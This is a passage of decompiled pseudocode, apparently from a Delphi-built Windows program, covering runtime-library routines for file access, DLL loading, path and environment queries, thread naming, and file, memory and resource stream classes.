    dwFlagsAndAttributes = dword_466A00[v4];
    v9 = (const WCHAR *)sub_407790(v14);
    FileW_0 = CreateFileW_0(v9, v6, v7, 0, v8, dwFlagsAndAttributes, 0);
    v11 = sub_423850(&v12);
    if ( qword_466818 < v11 )
      qword_466818 = v11;
  }
  return FileW_0;
}
// 4667E0: using guessed type int dword_4667E0;
// 466818: using guessed type __int64 qword_466818;
// 466834: using guessed type __int64 (__cdecl *dword_466834)(_DWORD, _DWORD, _DWORD);
// 4669D8: using guessed type DWORD dword_4669D8[5];
// 4669EC: using guessed type DWORD dwCreationDisposition[5];
// 466A00: using guessed type int dword_466A00[5];
// 466A14: using guessed type DWORD dword_466A14[3];

//----- (00426E30) --------------------------------------------------------
int __fastcall sub_426E30(int a1, char a2, DWORD *a3)
{
  int v4; // ebx
  const WCHAR *v5; // eax
  DWORD CompressedFileSizeW; // edi
  const WCHAR *v7; // eax
  char FileInformation[28]; // [esp+Ch] [ebp-28h] BYREF
  DWORD v10; // [esp+28h] [ebp-Ch]
  DWORD v11; // [esp+2Ch] [ebp-8h]
  DWORD FileSizeHigh; // [esp+30h] [ebp-4h] BYREF

  v4 = 0;
  *a3 = 0;
  a3[1] = 0;
  if ( a2 )
  {
    v5 = (const WCHAR *)sub_407790(a1);
    CompressedFileSizeW = GetCompressedFileSizeW(v5, &FileSizeHigh);
    if ( CompressedFileSizeW != -1 || !GetLastError_1() )
    {
      a3[1] = FileSizeHigh;
      *a3 = CompressedFileSizeW;
      LOBYTE(v4) = 1;
    }
  }
  else
  {
    v7 = (const WCHAR *)sub_407790(a1);
    if ( GetFileAttributesExW(v7, GetFileExInfoStandard, FileInformation) )
    {
      a3[1] = v10;
      *a3 = v11;
      LOBYTE(v4) = 1;
    }
  }
  return v4;
}
// 426E30: using guessed type char FileInformation[28];

//----- (00426EB0) --------------------------------------------------------
HMODULE __fastcall sub_426EB0(int a1, char a2)
{
  const WCHAR *v3; // eax
  const WCHAR *v4; // eax
  const WCHAR *v5; // eax
  unsigned int v7[2]; // [esp-30h] [ebp-50h] BYREF
  void **v8; // [esp-28h] [ebp-48h]
  _DWORD v9[3]; // [esp-24h] [ebp-44h] BYREF
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-18h] [ebp-38h] BYREF
  void *v11; // [esp-14h] [ebp-34h]
  void **v12; // [esp-10h] [ebp-30h]
  unsigned int v13[2]; // [esp-Ch] [ebp-2Ch] BYREF
  void **v14; // [esp-4h] [ebp-24h]
  int v15; // [esp+4h] [ebp-1Ch] BYREF
  int v16; // [esp+8h] [ebp-18h]
  unsigned __int16 v17; // [esp+Eh] [ebp-12h]
  UINT uMode; // [esp+10h] [ebp-10h]
  HMODULE LibraryW; // [esp+14h] [ebp-Ch]
  unsigned int v20; // [esp+18h] [ebp-8h]
  int v21; // [esp+1Ch] [ebp-4h] BYREF
  void *savedregs; // [esp+20h] [ebp+0h] BYREF

  v15 = 0;
  v21 = 0;
  HIBYTE(v20) = a2;
  v14 = &savedregs;
  v13[1] = (unsigned int)&loc_427005;
  v13[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v13);
  sub_406C44(&v21);
  if ( (v20 & 0x2000000) != 0 )
  {
    sub_4253F0(a1, &v15);
    sub_425250(v15, &v21);
    if ( v21 )
    {
      v3 = (const WCHAR *)sub_407790(v21);
      SetDllDirectoryW(v3);
    }
  }
  v12 = &savedregs;
  v11 = &loc_426FE0;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( (v20 & 0x1000000) != 0 )
  {
    uMode = SetErrorMode(0x8001u);
    v9[2] = &savedregs;
    v9[1] = &loc_426FBE;
    v9[0] = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v9);
    v17 = System::Get8087CW();
    v16 = sub_4050B0();
    v8 = &savedregs;
    v7[1] = (unsigned int)&loc_426FA0;
    v7[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v7);
    v5 = (const WCHAR *)sub_407790(a1);
    LibraryW = LoadLibraryW(v5);
    __writefsdword(0, v7[0]);
    v8 = (void **)&loc_426FA7;
    System::Set8087CW(v17);
    sub_405094(v16);
    __writefsdword(0, v20);
    savedregs = &loc_426FC5;
    SetErrorMode(uMode);
    __writefsdword(0, v20);
    savedregs = &loc_426FE7;
    if ( v21 )
      SetDllDirectoryW(0);
  }
  else
  {
    v4 = (const WCHAR *)sub_407790(a1);
    LibraryW = LoadLibraryW(v4);
    System::__linkproc__ TryFinallyExit(ExceptionList, v11, v12);
  }
  __writefsdword(0, v13[0]);
  v14 = (void **)&loc_42700C;
  sub_406C44(&v15);
  sub_406C44(&v21);
  return LibraryW;
}
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);

//----- (00427020) --------------------------------------------------------
FARPROC __fastcall sub_427020(HMODULE hModule, int a2)
{
  const CHAR *v3; // eax

  v3 = (const CHAR *)sub_4074F8(a2);
  return GetProcAddress_1(hModule, v3);
}

//----- (00427040) --------------------------------------------------------
_DWORD *__fastcall sub_427040(volatile __int32 *a1)
{
  HANDLE CurrentThread; // eax
  unsigned int v4[2]; // [esp-Ch] [ebp-18h] BYREF
  int *v5; // [esp-4h] [ebp-10h]
  int v6; // [esp+4h] [ebp-8h] BYREF
  HLOCAL hMem; // [esp+8h] [ebp-4h] BYREF
  int savedregs; // [esp+Ch] [ebp+0h] BYREF

  v6 = 0;
  v5 = &savedregs;
  v4[1] = (unsigned int)&loc_4270E7;
  v4[0] = (unsigned int)NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)v4);
  sub_406C44(a1);
  if ( *off_468104[0]
    && (hMem = 0,
        CurrentThread = GetCurrentThread(),
        (*(int (__stdcall **)(HANDLE, HLOCAL *))off_468104[0])(CurrentThread, &hMem) >= 0) )
  {
    unknown_libname_50(&v6, hMem);
    if ( v6 )
      sub_406FE8(a1, v6);
    LocalFree_0(hMem);
  }
  else if ( GetCurrentThreadId_0() == dword_46691C )
  {
    sub_406FE8(a1, dword_466920);
  }
  __writefsdword(0, v4[0]);
  v5 = (int *)&loc_4270EE;
  return sub_406C44(&v6);
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 46691C: using guessed type int dword_46691C;
// 466920: using guessed type int dword_466920;
// 468104: using guessed type int *off_468104[2];

//----- (00427100) --------------------------------------------------------
_DWORD *__fastcall sub_427100(const WCHAR *a1)
{
  unsigned __int16 CurrentThread; // [esp-20h] [ebp-44h]
  int v4; // [esp-1Ch] [ebp-40h]
  _DWORD v5[2]; // [esp-18h] [ebp-3Ch] BYREF
  int *v6; // [esp-10h] [ebp-34h]
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-30h] BYREF
  void *v8; // [esp-8h] [ebp-2Ch]
  int *v9; // [esp-4h] [ebp-28h]
  ULONG_PTR Arguments[4]; // [esp+Ch] [ebp-18h] BYREF
  __int32 v11; // [esp+1Ch] [ebp-8h] BYREF
  CHAR *v12; // [esp+20h] [ebp-4h] BYREF
  int savedregs; // [esp+24h] [ebp+0h] BYREF

  v12 = 0;
  v11 = 0;
  v9 = &savedregs;
  v8 = &loc_427203;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( !byte_466830 )
  {
    v6 = &savedregs;
    v5[1] = &loc_4271DB;
    v5[0] = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)v5);
    sub_407030(&v11, (__int32)a1);
    if ( GetCurrentThreadId_0() == dword_46691C )
      sub_406FE8(&dword_466920, v11);
    if ( *off_467F6C )
    {
      v4 = sub_407790(v11);
      CurrentThread = (unsigned __int16)GetCurrentThread();
      ((void (*)(void))*off_467F6C)();
    }
    sub_407634(&v12, a1, 0, CurrentThread);
    if ( v12 )
    {
      Arguments[0] = 4096;
      Arguments[1] = sub_4074F8((int)v12);
      Arguments[2] = -1;
      Arguments[3] = 0;
      RaiseException_1(0x406D1388u, 0, 4u, Arguments);
    }
    __writefsdword(0, v4);
  }
  __writefsdword(0, (unsigned int)v6);
  v8 = &loc_42720A;
  sub_406C44(&v11);
  return sub_406C68(&v12);
}
// 42718C: variable 'CurrentThread' is possibly undefined
// 42719C: variable 'v4' is possibly undefined
// 466830: using guessed type char byte_466830;
// 46691C: using guessed type int dword_46691C;
// 466920: using guessed type int dword_466920;
// 467F6C: using guessed type int *off_467F6C;

//----- (00427220) --------------------------------------------------------
int *__fastcall sub_427220(int (__fastcall *a1)(int, unsigned int, int), unsigned int a2, int a3, int *a4)
{
  int v4; // ecx
  int v5; // eax
  int v6; // ecx
  unsigned int v7; // esi
  int v8; // eax

  sub_406C44(a4);
  sub_407890(a4, a2, v4);
  v5 = sub_407790(*a4);
  v7 = a1(v5, a2, a3);
  if ( v7 > a2 )
  {
    sub_407890(a4, v7, v6);
    v8 = sub_407790(*a4);
    v7 = a1(v8, v7, a3);
  }
  sub_407890(a4, v7, v6);
  return sub_424610(a4);
}
// 427240: variable 'v4' is possibly undefined
// 427260: variable 'v6' is possibly undefined

//----- (00427290) --------------------------------------------------------
int *__fastcall sub_427290(int (__fastcall *a1)(int, unsigned int, int), unsigned int a2, int a3, int *a4)
{
  int v4; // eax
  unsigned int v5; // esi
  int v6; // eax

  sub_406C68(a4);
  sub_4075BC(a4, a2, 0);
  v4 = sub_4074F8(*a4);
  v5 = a1(v4, a2, a3);
  if ( v5 > a2 )
  {
    sub_4075BC(a4, v5, 0);
    v6 = sub_4074F8(*a4);
    v5 = a1(v6, v5, a3);
  }
  sub_4075BC(a4, v5, 0);
  return sub_424650(a4);
}

//----- (00427310) --------------------------------------------------------
DWORD __fastcall sub_427310(LPWSTR lpBuffer, DWORD nBufferLength)
{
  return GetTempPathW(nBufferLength, lpBuffer);
}

//----- (00427320) --------------------------------------------------------
DWORD __fastcall sub_427320(LPWSTR lpFilename, DWORD nSize, HMODULE *a3)
{
  return GetModuleFileNameW_1(*a3, lpFilename, nSize);
}

//----- (00427330) --------------------------------------------------------
DWORD __fastcall sub_427330(LPSTR lpFilename, DWORD nSize, HMODULE *a3)
{
  return GetModuleFileNameA(*a3, lpFilename, nSize);
}

//----- (00427340) --------------------------------------------------------
DWORD __fastcall sub_427340(LPWSTR lpszLongPath, DWORD cchBuffer, LPCWSTR lpszShortPath)
{
  return GetLongPathNameW(lpszShortPath, lpszLongPath, cchBuffer);
}

//----- (00427350) --------------------------------------------------------
DWORD __fastcall sub_427350(LPWSTR lpBuffer, DWORD nBufferLength)
{
  return GetCurrentDirectoryW(nBufferLength, lpBuffer);
}

//----- (00427360) --------------------------------------------------------
DWORD __fastcall sub_427360(LPWSTR lpBuffer, DWORD nSize, LPCWSTR lpName)
{
  return GetEnvironmentVariableW(lpName, lpBuffer, nSize);
}

//----- (00427370) --------------------------------------------------------
int *__fastcall sub_427370(int a1, int *a2)
{
  int v2; // eax

  v2 = sub_407790(a1);
  return sub_427220((int (__fastcall *)(int, unsigned int, int))sub_427340, 0x104u, v2, a2);
}

//----- (004273A0) --------------------------------------------------------
int *__fastcall sub_4273A0(int a1, int *a2)
{
  int v2; // eax

  v2 = sub_407790(a1);
  return sub_427220((int (__fastcall *)(int, unsigned int, int))sub_427360, 0x400u, v2, a2);
}

//----- (004273D0) --------------------------------------------------------
int *__fastcall sub_4273D0(int *a1)
{
  return sub_427220((int (__fastcall *)(int, unsigned int, int))sub_427310, 0x104u, 0, a1);
}

//----- (004273F0) --------------------------------------------------------
int *__fastcall sub_4273F0(int *a1)
{
  return sub_427220((int (__fastcall *)(int, unsigned int, int))sub_427350, 0x104u, 0, a1);
}

//----- (00427410) --------------------------------------------------------
int *__fastcall sub_427410(int a1, int *a2)
{
  int v3; // [esp+4h] [ebp-4h] BYREF

  v3 = a1;
  return sub_427220((int (__fastcall *)(int, unsigned int, int))sub_427320, 0x104u, (int)&v3, a2);
}

//----- (00427440) --------------------------------------------------------
int *__fastcall sub_427440(int a1, int *a2)
{
  int v3; // [esp+4h] [ebp-4h] BYREF

  v3 = a1;
  return sub_427290((int (__fastcall *)(int, unsigned int, int))sub_427330, 0x104u, (int)&v3, a2);
}

//----- (00427470) --------------------------------------------------------
__int64 __fastcall sub_427470(_DWORD *a1)
{
  return ((__int64 (__fastcall *)(_DWORD *, char, _DWORD, _DWORD))*(_DWORD *)(*a1 + 20))(a1, 1, *a1, 0);
}

//----- (004274C0) --------------------------------------------------------
__int64 __fastcall sub_4274C0(_DWORD *a1)
{
  __int64 v2; // rax
  int v4; // [esp+4h] [ebp-10h]
  __int64 v5; // [esp+Ch] [ebp-8h]

  v2 = ((__int64 (__fastcall *)(_DWORD *, char, _DWORD, _DWORD))*(_DWORD *)(*a1 + 20))(a1, 1, *a1, 0);
  v4 = v2;
  BYTE4(v2) = 2;
  v5 = ((__int64 (__fastcall *)(_DWORD *, _DWORD, _DWORD, _DWORD))*(_DWORD *)(*a1 + 20))(a1, HIDWORD(v2), *a1, 0);
  (*(void (__fastcall **)(_DWORD *, _DWORD, _DWORD, int))(*a1 + 20))(a1, 0, *a1, v4);
  return v5;
}

//----- (00427510) --------------------------------------------------------
void __stdcall sub_427510(int a1, int a2)
{
  ;
}

//----- (00427520) --------------------------------------------------------
__int64 __userpurge sub_427520@<edx:eax>(int *a1@<eax>, int a2@<edi>, int a3@<esi>, int a4, int a5)
{
  int v6; // edx
  int v7; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-24h] BYREF
  void *v10; // [esp-8h] [ebp-20h]
  int *v11; // [esp-4h] [ebp-1Ch]
  void *v12; // [esp+0h] [ebp-18h]
  int v13; // [esp+4h] [ebp-14h] BYREF
  int v14; // [esp+8h] [ebp-10h] BYREF
  char v15; // [esp+Ch] [ebp-Ch]
  __int64 v16; // [esp+10h] [ebp-8h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  v13 = 0;
  v11 = &savedregs;
  v10 = &loc_427583;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  sub_405514(*a1, (int)&v13);
  v14 = v13;
  v15 = 17;
  LOBYTE(v6) = 1;
  v7 = Sysutils::Exception::Exception((int)cls_CrossPlatform_EStreamError, v6, off_4681B8, (int)&v14, 0);
  sub_406340(v7, (int)a1, (int)&savedregs, a2, a3);
  __writefsdword(0, (unsigned int)v10);
  v12 = &loc_42758A;
  sub_406C44(&v13);
  return v16;
}
// 427563: variable 'v6' is possibly undefined
// 422B6C: using guessed type int (*cls_CrossPlatform_EStreamError[2])();

//----- (004275A0) --------------------------------------------------------
int __usercall sub_4275A0@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>)
{
  int result; // eax
  int v5; // ebx
  int v6; // edx
  int v7; // esi
  int v8; // eax
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  result = (*(int (__fastcall **)(int, int, int))(*(_DWORD *)a1 + 12))(a1, a2, a3);
  v5 = result;
  while ( v5 < a3 )
  {
    result = (*(int (__fastcall **)(int, int, int))(*(_DWORD *)a1 + 12))(a1, v5 + a2, a3 - v5);
    v7 = result;
    if ( result > 0 )
    {
      v5 += result;
    }
    else
    {
      LOBYTE(v6) = 1;
      v8 = Sysutils::Exception::Exception((int)cls_CrossPlatform_EReadError, v6, off_468174);
      result = sub_406340(v8, v5, (int)&savedregs, a4, v7);
    }
  }
  return result;
}
// 4275EB: variable 'v6' is possibly undefined
// 422CBC: using guessed type int (*cls_CrossPlatform_EReadError[2])();

//----- (00427610) --------------------------------------------------------
int __usercall sub_427610@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ecx>, int a4@<edi>)
{
  int result; // eax
  int v5; // ebx
  int v6; // edx
  int v7; // esi
  int v8; // eax
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  result = (*(int (__fastcall **)(int, int, int))(*(_DWORD *)a1 + 16))(a1, a2, a3);
  v5 = result;
  while ( v5 < a3 )
  {
    result = (*(int (__fastcall **)(int, int, int))(*(_DWORD *)a1 + 16))(a1, v5 + a2, a3 - v5);
    v7 = result;
    if ( result > 0 )
    {
      v5 += result;
    }
    else
    {
      LOBYTE(v6) = 1;
      v8 = Sysutils::Exception::Exception((int)cls_CrossPlatform_EWriteError, v6, off_468038);
      result = sub_406340(v8, v5, (int)&savedregs, a4, v7);
    }
  }
  return result;
}
// 42765B: variable 'v6' is possibly undefined
// 422D60: using guessed type int (*cls_CrossPlatform_EWriteError[2])();

//----- (00427680) --------------------------------------------------------
char __stdcall sub_427680(int a1, int a2)
{
  return 1;
}

//----- (00427690) --------------------------------------------------------
__int64 __fastcall sub_427690(_DWORD *a1, int *a2, __int64 a3)
{
  int v5; // ecx
  int v6; // edi
  int v7; // ecx
  int v8; // ebx
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp+4h] [ebp-2Ch] BYREF
  __int64 v11; // [esp+8h] [ebp-28h]
  void *v12; // [esp+10h] [ebp-20h]
  int Mem; // [esp+1Ch] [ebp-14h]
  __int64 v14; // [esp+20h] [ebp-10h]
  int *v15; // [esp+2Ch] [ebp-4h]
  int savedregs; // [esp+30h] [ebp+0h] BYREF

  v15 = a2;
  if ( !a3 )
  {
    v11 = 0i64;
    (*(void (__fastcall **)(int *, _DWORD, _DWORD, _DWORD))(*v15 + 20))(v15, 0, *v15, 0);
    a3 = ((__int64 (__fastcall *)(int *))*(_DWORD *)*v15)(v15);
  }
  if ( sub_40576C(v15, (int)&cls_CrossPlatform_TCustomMemoryStream) )
  {
    v14 = 0i64;
    if ( a3 > 0 && v15[3] >= 0 )
    {
      v11 = v15[2];
      v5 = v15[3];
      v11 -= v5;
      v14 = v11;
      if ( v11 > 0 )
      {
        if ( v14 > a3 )
          v14 = a3;
        sub_427610((int)a1, v15[1] + v5, v14, v14);
        v15[3] += v14;
      }
    }
    v11 = 0i64;
    (*(void (__fastcall **)(_DWORD *, _DWORD, int))(*a1 + 8))(a1, *a1, v5);
  }
  else
  {
    v14 = a3;
    if ( a3 <= 61440 )
      v6 = a3;
    else
      v6 = 61440;
    Mem = System::__linkproc__ GetMem(v6);
    HIDWORD(v11) = &savedregs;
    LODWORD(v11) = &loc_427840;
    ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
    __writefsdword(0, (unsigned int)&ExceptionList);
    while ( a3 )
    {
      if ( v6 >= a3 )
        v8 = a3;
      else
        v8 = v6;
      if ( !(*(unsigned __int8 (__fastcall **)(_DWORD *, _DWORD, int))(*a1 + 8))(a1, *a1, v7) )
      {
        v14 -= a3;
        System::__linkproc__ TryFinallyExit(ExceptionList, v11, HIDWORD(v11));
        return v14;
      }
      sub_4275A0((int)v15, Mem, v8, v6);
      sub_427610((int)a1, Mem, v8, v6);
      a3 -= v8;
    }
    (*(void (__fastcall **)(_DWORD *, _DWORD, int, _DWORD))(*a1 + 8))(a1, *a1, v7, 0);
    __writefsdword(0, v11);
    v12 = &loc_427847;
    System::__linkproc__ FreeMem(Mem);
  }
  return v14;
}
// 42776A: variable 'v5' is possibly undefined
// 4277D7: variable 'v7' is possibly undefined
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 406434: using guessed type _DWORD __stdcall System::__linkproc__ TryFinallyExit(_DWORD, _DWORD, _DWORD);
// 4226DC: using guessed type int (*cls_CrossPlatform_TCustomMemoryStream)();

//----- (004278A0) --------------------------------------------------------
int __fastcall sub_4278A0(int a1, void *a2, DWORD a3)
{
  int result; // eax

  result = Sysutils::FileRead(*(HANDLE *)(a1 + 4), a2, a3);
  if ( result == -1 )
    return 0;
  return result;
}

//----- (004278C0) --------------------------------------------------------
DWORD __fastcall sub_4278C0(int a1, const void *a2, DWORD a3)
{
  DWORD result; // eax

  result = sub_415794(*(HANDLE *)(a1 + 4), a2, a3);
  if ( result == -1 )
    return 0;
  return result;
}

//----- (004278E0) --------------------------------------------------------
int __fastcall sub_4278E0(int a1, char a2, __int64 a3)
{
  return Sysutils::FileSeek(*(HANDLE *)(a1 + 4), a3, a2 & 0x7F);
}

//----- (00427950) --------------------------------------------------------
int __fastcall sub_427950(_DWORD *a1, void *a2, int a3)
{
  int v4; // eax
  int v5; // esi

  v4 = a1[3];
  if ( v4 < 0 )
    return 0;
  if ( a3 < 0 )
    return 0;
  v5 = a1[2] - v4;
  if ( v5 <= 0 )
    return 0;
  if ( a3 < v5 )
    v5 = a3;
  System::Move((const void *)(v4 + a1[1]), a2, v5);
  a1[3] += v5;
  return v5;
}

//----- (004279A0) --------------------------------------------------------
__int64 __fastcall sub_4279A0(int a1, char a2, int a3, int a4, int a5)
{
  bool v5; // cf
  char v6; // dl

  v5 = a2 == 0;
  v6 = a2 - 1;
  if ( v5 )
  {
    *(_DWORD *)(a1 + 12) = a5;
  }
  else if ( v6 )
  {
    if ( v6 == 1 )
      *(_DWORD *)(a1 + 12) = a5 + *(_DWORD *)(a1 + 8);
  }
  else
  {
    *(_DWORD *)(a1 + 12) += a5;
  }
  return *(int *)(a1 + 12);
}

//----- (004279F0) --------------------------------------------------------
int __usercall sub_4279F0@<eax>(int result@<eax>, int a2@<edx>, int a3@<edi>)
{
  int v3; // ecx

  v3 = *(_DWORD *)(result + 8);
  if ( v3 )
    return sub_427610(a2, *(_DWORD *)(result + 4), v3, a3);
  return result;
}

//----- (00427A10) --------------------------------------------------------
int sub_427A10()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  sub_427A40((_DWORD *)v0);
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40591C: using guessed type __int64 System::__linkproc__ BeforeDestruction(void);

//----- (00427A40) --------------------------------------------------------
int __fastcall sub_427A40(_DWORD *a1)
{
  return sub_427AB0(a1, 0);
}

//----- (00427A50) --------------------------------------------------------
int __cdecl sub_427A50(int a1)
{
  int result; // eax

  result = *(_DWORD *)(*(_DWORD *)(a1 - 4) + 16) / 8;
  if ( result < 128 )
    result = 128;
  if ( result > 10000000 )
    return 10000000;
  return result;
}

//----- (00427A80) --------------------------------------------------------
int __fastcall sub_427A80(int a1, int a2)
{
  int result; // eax
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  result = *(_DWORD *)(a1 + 16);
  if ( a2 > result )
  {
    result = *(_DWORD *)(a1 + 16) + sub_427A50((int)&savedregs);
    if ( a2 > result )
      return a2;
  }
  return result;
}

//----- (00427AB0) --------------------------------------------------------
int __fastcall sub_427AB0(_DWORD *a1, int a2)
{
  int v5; // eax
  int result; // eax
  int v7; // [esp+Ch] [ebp-4h]

  v5 = (*(int (__fastcall **)(_DWORD *, int))(*a1 + 28))(a1, a2);
  v7 = a1[2];
  a1[1] = v5;
  result = v7;
  a1[2] = v7;
  a1[4] = a2;
  if ( a2 < a1[2] )
    a1[2] = a2;
  if ( a2 < a1[3] )
    a1[3] = a2;
  return result;
}

//----- (00427AF0) --------------------------------------------------------
int __fastcall sub_427AF0(_DWORD *a1, __int64 a2)
{
  int v5; // esi
  __int64 v6; // rax

  v5 = a1[3];
  sub_427AB0(a1, a2);
  a1[2] = a2;
  v6 = v5;
  if ( v5 > a2 )
  {
    BYTE4(v6) = 2;
    LODWORD(v6) = (*(int (__fastcall **)(_DWORD *, _DWORD, _DWORD, _DWORD))(*a1 + 20))(a1, HIDWORD(v6), *a1, 0);
  }
  return v6;
}

//----- (00427B30) --------------------------------------------------------
int __usercall sub_427B30@<eax>(int a1@<eax>, int a2@<edx>, int a3@<ebx>, int a4@<edi>, int a5@<esi>)
{
  int v5; // edx
  int v6; // eax
  int Mem; // [esp+4h] [ebp-4h] BYREF
  int savedregs; // [esp+8h] [ebp+0h] BYREF

  if ( a2 == *(_DWORD *)(a1 + 16) )
    return *(_DWORD *)(a1 + 4);
  if ( a2 )
  {
    if ( *(_DWORD *)(a1 + 16) )
    {
      Mem = *(_DWORD *)(a1 + 4);
      System::__linkproc__ ReallocMem((int)&Mem, a2);
    }
    else
    {
      Mem = System::__linkproc__ GetMem(a2);
    }
    if ( !Mem )
    {
      LOBYTE(v5) = 1;
      v6 = Sysutils::Exception::Exception((int)cls_CrossPlatform_EStreamError, v5, off_4681A8);
      sub_406340(v6, a3, (int)&savedregs, a4, a5);
    }
  }
  else
  {
    System::__linkproc__ FreeMem(*(_DWORD *)(a1 + 4));
    return 0;
  }
  return Mem;
}
// 427B8F: variable 'v5' is possibly undefined
// 404D94: using guessed type int __fastcall System::__linkproc__ GetMem(_DWORD);
// 404DB0: using guessed type int __fastcall System::__linkproc__ FreeMem(_DWORD);
// 422B6C: using guessed type int (*cls_CrossPlatform_EStreamError[2])();

//----- (00427BA0) --------------------------------------------------------
int __fastcall sub_427BA0(_DWORD *a1, const void *a2, int a3)
{
  int v5; // eax
  int v6; // edi
  int v7; // eax

  v5 = a1[3];
  if ( v5 < 0 )
    return 0;
  if ( a3 < 0 )
    return 0;
  v6 = a3 + v5;
  if ( a3 + v5 <= 0 )
    return 0;
  if ( v6 > a1[2] )
  {
    if ( v6 > a1[4] )
    {
      v7 = (*(int (__fastcall **)(_DWORD *, int))(*a1 + 32))(a1, a3 + v5);
      sub_427AB0(a1, v7);
    }
    a1[2] = v6;
  }
  System::Move(a2, (void *)(a1[3] + a1[1]), a3);
  a1[3] = v6;
  return a3;
}

//----- (00427C60) --------------------------------------------------------
_DWORD *__usercall sub_427C60@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>, int a4)
{
  int v4; // eax
  struct _EXCEPTION_REGISTRATION_RECORD *ExceptionList; // [esp-Ch] [ebp-20h] BYREF
  void *v7; // [esp-8h] [ebp-1Ch]
  int *v8; // [esp-4h] [ebp-18h]
  int v9; // [esp+0h] [ebp-14h] BYREF
  int v10; // [esp+4h] [ebp-10h] BYREF
  char v11; // [esp+8h] [ebp-Ch]
  int v12; // [esp+Ch] [ebp-8h] BYREF
  signed int v13; // [esp+10h] [ebp-4h]
  int savedregs; // [esp+14h] [ebp+0h] BYREF

  v9 = 0;
  v12 = 0;
  v8 = &savedregs;
  v7 = &loc_427CF8;
  ExceptionList = NtCurrentTeb()->NtTib.ExceptionList;
  __writefsdword(0, (unsigned int)&ExceptionList);
  if ( *(_BYTE *)(a4 + 8) )
  {
    v13 = *(_DWORD *)(a4 - 4);
    sub_415150(v13, &v12);
  }
  else
  {
    unknown_libname_50(&v12, *(_DWORD *)(a4 - 4));
  }
  v10 = v12;
  v11 = 17;
  sub_40B51C((int **)off_46800C, &v9);
  v4 = Sysutils::Exception::Exception(0, &v10);
  sub_406340(v4, a1, (int)&savedregs, a2, a3);
  __writefsdword(0, (unsigned int)v7);
  v9 = (int)&loc_427CFF;
  sub_406C44(&v9);
  return sub_406C44(&v12);
}
// 4077E8: using guessed type int __fastcall unknown_libname_50(_DWORD, _DWORD);
// 41A780: using guessed type _DWORD __stdcall Sysutils::Exception::Exception(_DWORD, _DWORD);

//----- (00427D10) --------------------------------------------------------
DWORD __fastcall sub_427D10(int a1, HMODULE hModule, const WCHAR *a3, const WCHAR *lpType, LPCWSTR a5)
{
  HRSRC ResourceW; // eax
  HGLOBAL Resource; // eax
  DWORD result; // eax
  LPVOID v10; // [esp+10h] [ebp-8h]
  int savedregs; // [esp+18h] [ebp+0h] BYREF

  ResourceW = FindResourceW(hModule, a3, lpType);
  *(_DWORD *)(a1 + 16) = ResourceW;
  if ( !ResourceW )
    sub_427C60(a1, 0, (int)hModule, (int)&savedregs);
  Resource = LoadResource(hModule, *(HRSRC *)(a1 + 16));
  *(_DWORD *)(a1 + 20) = Resource;
  if ( !Resource )
    sub_427C60(a1, 0, (int)hModule, (int)&savedregs);
  v10 = LockResource(*(HGLOBAL *)(a1 + 20));
  result = SizeofResource(hModule, *(HRSRC *)(a1 + 16));
  *(_DWORD *)(a1 + 4) = v10;
  *(_DWORD *)(a1 + 8) = result;
  return result;
}

//----- (00427D90) --------------------------------------------------------
int sub_427D90()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  FreeResource(*(HGLOBAL *)(v0 + 20));
  result = sub_405588();
  if ( v1 > 0 )
    return System::__linkproc__ ClassDestroy(v2);
  return result;
}
// 4058C4: using guessed type int __fastcall System::__linkproc__ ClassDestroy(_DWORD);
// 40591C: using guessed type __int64 System::__linkproc__ BeforeDestruction(void);

//----- (00427DD0) --------------------------------------------------------
int __usercall sub_427DD0@<eax>(int a1@<ebx>, int a2@<edi>, int a3@<esi>)
{
  int v3; // eax
  int savedregs; // [esp+0h] [ebp+0h] BYREF

  v3 = Sysutils::Exception::Exception((int)cls_CrossPlatform_EStreamError, 1, off_468024);
  sub_406340(v3, a1, (int)&savedregs, a2, a3);
  return -1;
}
// 422B6C: using guessed type int (*cls_CrossPlatform_EStreamError[2])();

//----- (00427F10) --------------------------------------------------------
int sub_427F10()
{
  __int64 v0; // rax
  char v1; // bl
  int v2; // esi
  int result; // eax

  v0 = System::__linkproc__ BeforeDestruction();
  v1 = BYTE4(v0);
  v2 = v0;
  (*(void (__fastcall **)(_DWORD))(*(_DWORD *)v0 + 8))(v0);
  result = sub_405588();
